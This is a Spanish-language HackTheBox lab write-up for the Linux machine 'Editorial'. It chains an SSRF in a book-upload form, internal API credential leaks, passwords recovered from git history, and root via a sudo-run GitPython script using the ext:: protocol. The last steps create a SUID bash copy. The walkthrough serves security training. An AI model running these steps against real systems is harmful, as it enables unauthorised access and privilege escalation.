# Editorial

![](../../../../~gitbook/image.md)Publicado: 06 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Editorial es una máquina Linux de dificultad Easy de HackTheBox que simula un sitio web editorial donde se pueden publicar libros. La máquina presenta vulnerabilidades de SSRF (Server-Side Request Forgery) que permiten enumerar servicios internos, exposición de credenciales a través de una API interna, filtración de información sensible en repositorios Git, y escalada de privilegios mediante un script Python vulnerable que utiliza GitPython de forma insegura.El vector de ataque principal comienza con la explotación de SSRF para descubrir servicios internos, seguido de la obtención de credenciales a través de una API expuesta, movimiento lateral usando credenciales encontradas en el historial de Git, y finalmente escalada de privilegios aprovechando una configuración insegura de Git que permite ejecución de comandos arbitrarios.
### 🎯 Resumen de Vulnerabilidades
- SSRF (Server-Side Request Forgery) - Puerto 80
- Exposición de API interna - Puerto 5000
- Credenciales hardcodeadas en respuestas de API
- Filtración de credenciales en historial de Git
- Ejecución de comandos via Git remote-ext protocol
- Configuración insegura de GitPython

### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🌐 Enumeración Web

#### 80 / TCP - editorial.htb
![](../../../../~gitbook/image.md)Revisando el contenido del sitio web encontramos otro dominio que añadimos al scope por si pudiese revelar algo.![](../../../../~gitbook/image.md)
#### 🕷️Fuzzing de directorios y vhosts
Tras probar a realizar fuzzing con diversas herramientas como dirsearch, gobuster y feroxbuster, no encontramos ningún recurso que añadir a nuestro scope que pueda ser de utilidad ni tampoco ningún subdominio para editorial.htb ni tiempoarriba.htb.
####

#### 📄 Análisis de la sección "Publish with us"
Vemos una función de carga de achivos que a priori no filtra por la extensión. Probamos a subir una web shell en php incrustada en una imagen e interceptamos la petición con burp:![](../../../../~gitbook/image.md)Observamos que existen dos parámetros en el formulario (bookfile y bookurl), Obtenemos en la respuesta la URL donde ha quedado alojado el archivo:![](../../../../~gitbook/image.md)Pero al tratar de acceder, parece que no se está ejecutando PHP en el sistema, ya que lo que hace es únicamente descargar el archivo:![](../../../../~gitbook/image.md)
#### 🎯 Explotación - SSRF (Server-Side Request Forgery)
Cambiamos de estrategia y verificamos si podemos abusar del parámetro bookurl para explotar un SSRF. Para comprobar esto, hacemos una pequeña PoC, iniciamos en nuestro host de ataque un servidor web con python:En la solicitud, añadimos la ip de nuestro host de ataque:![](../../../../~gitbook/image.md)Recibimos la petición en nuestro servidor con un 200:![](../../../../~gitbook/image.md)
#### 🔎 Enumeración de puertos internos
Aprovechando la vulnerabilidad SSRF, verificamos si hay otros puertos o servicios ejecutándose internamente en la máquina:- Guardamos la solicitud desde Burp indicando con la palabra `FUZZ` donde queremos realizar el fuzzing
- Utilizamos ffuf para realizar el ataque pasando como payload una lista numérica de 0 a 65535:
![](../../../../~gitbook/image.md)Y ahora con la herramienta ffuff realizar el ataque pasando como payload una lista numérica de 0 a 65535 que es el número posible de puertos:![](../../../../~gitbook/image.md)Obtenemos una única respuesta en el puerto 5000.
#### 🔓 Acceso a API interna - Puerto 5000
Realizamos una petición SSRF al puerto 5000 interno y descargamos la respuesta:
Hacemos ahora una petición a ese puerto para ver qué nos devuelve:![](../../../../~gitbook/image.md)Descargamos el enlace de la respuesta:![](../../../../~gitbook/image.md)Descubrimiento crítico: El servicio interno expone una API que revela múltiples endpoints:Leemos el contenido del fichero y vemos que parece que se trata de un JSON:![](../../../../~gitbook/image.md)Usamos jq para obtener un mejor formato de salida:
#### 💎 Obtención de credenciales
![](../../../../~gitbook/image.md)Probamos todos los endpoints descubiertos y encontramos que `/api/latest/metadata/messages/authors` responde con información sensible:¡Credenciales obtenidas!- Usuario: `dev`
- Contraseña: `dev080217_devAPI!@`
Obtenemos un usuario y una contraseña. Dado que disponemos de un servicio ssh en el puerto 22, merece la pena probar estas credenciales para ver si logramos ganar acceso a la máquina para obtener la primera flag en el directorio del usuario dev:
#### 🔄 Movimiento lateral: dev → prod
Encontramos una carpeta llamada apps en el directorio del usuario /dev que vemos que contiene un repositorio gitEl comando `git status`muestra todos los archivos que estaban presentes en la última confirmación que ya no están allí, por lo que se muestran como eliminados:![](../../../../~gitbook/image.md)
#### 📚 Análisis del historial Git
Examinamos el historial de commits para buscar información sensible:Análisis de diferencias entre commits:Podemos ver diferencias de cambios entre varios commits con el siguiente comando:![](../../../../~gitbook/image.md)¡Credenciales encontradas! Al comparar commits, descubrimos que se subieron credenciales del usuario de producción que posteriormente fueron eliminadas:- Usuario: `prod`
- Contraseña: `080217_Producti0n_2023!@`

#### ⬆️ Escalada de privilegios: prod → root
🔍 Enumeración de permisos sudoVerificamos si el usuario prod puede ejecutar algo como root:Verificamos los permisos que tiene el usuario prod sobre este script y vemos que puede leerlo y ejecutarlo:Revisamos el contenido del script para analizarlo:
#### 🚨 Identificación de la vulnerabilidad
Vulnerabilidades encontradas:- Falta de sanitización del input del usuario (`url_to_clone`)
- Configuración peligrosa: `protocol.ext.allow=always` habilitado
- Ejecución con privilegios root via sudo
- Uso de git-remote-ext que permite ejecución de comandos locales
El protocolo `ext::` de Git permite ejecutar comandos como si fueran servidores remotos, y la configuración `protocol.ext.allow=always` elimina todas las restricciones de seguridad.
#### 💥 Explotación
Paso 1: Creamos un script malicioso que se ejecutará como root:Paso 2: Ejecutar el script con `git-remote-ext`.Esto funciona porque `ext::<cmd>` hace que Git ejecute el comando como un "servidor remoto", y con `protocol.ext.allow=always`, no hay restricciones.Paso 3: , usamos la shell con SUID para escalar a root:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🎯 Resumen de Vulnerabilidades](#resumen-de-vulnerabilidades)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯  ping -c2 10.10.11.20
PING 10.10.11.20 (10.10.11.20) 56(84) bytes of data.
64 bytes from 10.10.11.20: icmp_seq=1 ttl=63 time=43.6 ms
64 bytes from 10.10.11.20: icmp_seq=2 ttl=63 time=44.3 ms

--- 10.10.11.20 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 43.635/43.952/44.270/0.317 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.20 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.11.20 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:30 CEST
Nmap scan report for 10.10.11.20
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts
```

```
python3 -m http.server
```

```
ffuf -u http://editorial.htb/upload-cover -request ssrf.request -w
```
cat 28a491b1-4c31-4547-a939-fe83d6591576 | jq
```

```
{
"messages": [
{
"promotions": {
"description": "Retrieve a list of all the promotions in our library.",
"endpoint": "/api/latest/metadata/messages/promos",
"methods": "GET"
}
},
{
"coupons": {
"description": "Retrieve the list of coupons to use in our library.",
"endpoint": "/api/latest/metadata/messages/coupons",
"methods": "GET"
}
},
{
"new_authors": {
"description": "Retrieve the welcome message sended to our new authors.",
"endpoint": "/api/latest/metadata/messages/authors",
"methods": "GET"
}
},
{
"platform_use": {
"description": "Retrieve examples of how to use the platform.",
"endpoint": "/api/latest/metadata/messages/how_to_use_platform",
"methods": "GET"
}
}
],
"version": [
{
"changelog": {
"description": "Retrieve a list of all the versions and updates of the api.",
"endpoint": "/api/latest/metadata/changelog",
"methods": "GET"
}
},
{
"latest": {
"description": "Retrieve the last version of api.",
"endpoint": "/api/latest/metadata",
"methods": "GET"
}
}
]
}
```

```
{
"template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

```
curl -s 'http://editorial.htb/static/uploads/bbd73882-bd37-46f9-a239-8f44a4286f8d' | jq .
```

```
{
"template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

```
ssh dev@10.10.11.20
```

```
The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ whoami
dev
dev@editorial:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
dev@editorial:~$
dev@editorial:/home$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Jun  5  2024 .
drwxr-xr-x 18 root root 4096 Jun  5  2024 ..
drwxr-x---  4 dev  dev  4096 Jun  5  2024 dev
drwxr-x---  5 prod prod 4096 Jun  5  2024 prod
dev@editorial:/home$ cd dev
dev@editorial:~$ ls -la
total 32
drwxr-x--- 4 dev  dev  4096 Jun  5  2024 .
drwxr-xr-x 4 root root 4096 Jun  5  2024 ..
drwxrwxr-x 3 dev  dev  4096 Jun  5  2024 apps
lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
drwx------ 2 dev  dev  4096 Jun  5  2024 .cache
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
-rw-r----- 1 root dev    33 Jun  6 07:27 user.txt
```

```
dev@editorial:/home$ sudo -l
[sudo] password for dev:
Sorry, user dev may not run sudo on editorial.
dev@editorial:/home$
```

```
dev@editorial:~/apps/.git/info$ cd ..
dev@editorial:~/apps/.git$ ls -la
total 56
drwxr-xr-x  8 dev dev 4096 Jun  5  2024 .
drwxrwxr-x  3 dev dev 4096 Jun  5  2024 ..
drwxr-xr-x  2 dev dev 4096 Jun  5  2024 branches
-rw-r--r--  1 dev dev  253 Jun  4  2024 COMMIT_EDITMSG
-rw-r--r--  1 dev dev  177 Jun  4  2024 config
-rw-r--r--  1 dev dev   73 Jun  4  2024 description
-rw-r--r--  1 dev dev   23 Jun  4  2024 HEAD
drwxr-xr-x  2 dev dev 4096 Jun  5  2024 hooks
-rw-r--r--  1 dev dev 6163 Jun  4  2024 index
drwxr-xr-x  2 dev dev 4096 Jun  5  2024 info
drwxr-xr-x  3 dev dev 4096 Jun  5  2024 logs
drwxr-xr-x 70 dev dev 4096 Jun  5  2024 objects
drwxr-xr-x  4 dev dev 4096 Jun  5  2024 refs
```

```
git log --oneline
```

```
dev@editorial:~/apps$ git log --oneline
WARNING: terminal is not fully functional
Press RETURN to continue
8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```

```
git diff [hash] [hash]
```

```
git diff 1e84a03 b73481b
```

```
dev@editorial:~/apps$ su prod
Password:
prod@editorial:/home/dev/apps$ whoami
prod
prod@editorial:/home/dev/apps$ id
uid=1000(prod) gid=1000(prod) groups=1000(prod)
prod@editorial:/home/dev/apps$
```

```
prod@editorial:~$ sudo -l
[sudo] password for prod:
Matching Defaults entries for prod on editorial:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
(root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
prod@editorial:~$
```

```
prod@editorial:~$ ls -la /opt/internal_apps/clone_changes/clone_prod_change.py
-rwxr-x--- 1 root prod 256 Jun  4  2024 /opt/internal_apps/clone_changes/clone_prod_change.py
```

```
# !/usr/bin/python3
import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')
url_to_clone = sys.argv[1]
r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

```

```
echo '#!/bin/bash' > /tmp/rootme.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/rootme.sh
chmod +x /tmp/rootme.sh
```

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py ext::/tmp/rootme.sh
```

```
/tmp/rootbash -p
```
